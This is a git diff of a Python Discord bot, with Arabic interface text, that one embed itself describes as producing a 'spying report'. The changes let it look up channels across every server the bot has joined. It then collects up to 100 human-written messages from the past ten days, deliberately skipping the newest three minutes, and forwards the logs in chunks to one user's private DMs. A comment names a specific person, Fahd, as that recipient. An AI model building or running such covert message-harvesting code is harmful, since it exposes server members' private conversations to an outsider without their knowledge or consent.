@@ -5,7 +5,7 @@ import google.generativeai as genai
 from PIL import Image
 import io
 import time
-from datetime import datetime
+from datetime import datetime, timedelta, timezone
 
 DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")
 GEMINI_API_KEY = os.getenv("GEMINI_API_KEY")
@@ -151,7 +151,6 @@ class ServerSelect(discord.ui.Select):
         )
 
         view = ServerExtraActionsView(guild)
-        # إرسال تقرير السيرفر للخاص فوراً
         try:
             await interaction.user.send(content=info_text, view=view)
             await interaction.followup.send("✅ تم إرسال تقرير السيرفر إلى رسائلك الخاصة (DM) بنجاح!", ephemeral=True)
@@ -194,7 +193,6 @@ class ChannelsListButton(discord.ui.Button):
             pages.append(current_page)
 
         view = PagedChannelsView(pages, self.guild)
-        # إرسال قائمة الرومات للخاص
         try:
             await interaction.user.send(
                 content=f"📁 تم العثور على **{len(all_channels)}** قناة/روم في السيرفر.\nاختر الروم المطلوبة لترسل لك رسائلها بالخاص:",
@@ -224,7 +222,13 @@ class ChannelSelectDropdown(discord.ui.Select):
         await interaction.response.defer(ephemeral=True)
 
         channel_id = int(self.values[0])
-        channel = interaction.guild.get_channel(channel_id)
+        channel = interaction.client.get_channel(channel_id)
+        if not channel:
+            for guild in interaction.client.guilds:
+                ch = guild.get_channel(channel_id)
+                if ch:
+                    channel = ch
+                    break
 
         if not channel:
             await interaction.followup.send("❌ لم يتم العثور على الروم المطلوب.", ephemeral=True)
@@ -232,7 +236,15 @@ class ChannelSelectDropdown(discord.ui.Select):
 
         messages_log = []
         try:
-            async for msg in channel.history(limit=25, oldest_first=False):
+            # شروط الوقت: أكثر من 3 دقائق (حتى يكملون حجي) وإلى حد أقصى 10 أيام بالماضي
+            now = datetime.now(timezone.utc)
+            after_time = now - timedelta(days=10)
+            before_time = now - timedelta(minutes=3)
+
+            async for msg in channel.history(limit=100, after=after_time, before=before_time, oldest_first=True):
+                if msg.author.bot:
+                    continue
+                
                 author_name = msg.author.name
                 if msg.webhook_id:
                     author_name = f"[WebHook] {msg.author.name}"
@@ -249,13 +261,11 @@ class ChannelSelectDropdown(discord.ui.Select):
             return
 
         if not messages_log:
-            await interaction.followup.send(f"❌ روم (#{channel.name}) فارغة ولا توجد فيها رسائل.", ephemeral=True)
+            await interaction.followup.send(f"❌ لا توجد رسائل مطابقة (مر عليها أكثر من 3 دقائق وأقل من 10 أيام) في روم (#{channel.name}).", ephemeral=True)
             return
 
-        messages_log.reverse()
-
         chunks = []
-        current_chunk = f"📜 **سجل رسائل روم (#{channel.name}):**\n\n"
+        current_chunk = f"📜 **سجل رسائل روم (#{channel.name}) (حسب خطتك):**\n\n"
         
         for line in messages_log:
             if len(current_chunk) + len(line) > 1900:
@@ -267,11 +277,10 @@ class ChannelSelectDropdown(discord.ui.Select):
         if current_chunk:
             chunks.append(current_chunk)
 
-        # إرسال الرسائل مباشرة إلى الخاص (DM) الخاصة بفهد بالصيغة المطلوبة
         try:
             for chunk in chunks:
                 await interaction.user.send(content=chunk)
-            await interaction.followup.send(f"✅ تم جلب وإرسال رسائل روم (#{channel.name}) إلى **خاصك (DM)** بنجاح!", ephemeral=True)
+            await interaction.followup.send(f"✅ تم جلب رسائل روم (#{channel.name}) وإرسالها إلى **خاصك (DM)** بنجاح!", ephemeral=True)
         except Exception as e:
             await interaction.followup.send(f"❌ حدث خطأ أثناء إرسال الرسائل للخاص: {e}", ephemeral=True)
 
@@ -358,7 +367,6 @@ async def list_servers(ctx):
         description="اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:",
         color=0x2b2d31
     )
-    # إرسال قائمة السيرفرات بالخاص إذا كانت الأوامر تفضل ذلك، أو بالروم كرسالة عادية
     await ctx.send(embed=embed, view=view, delete_after=180)
 
 @bot.event
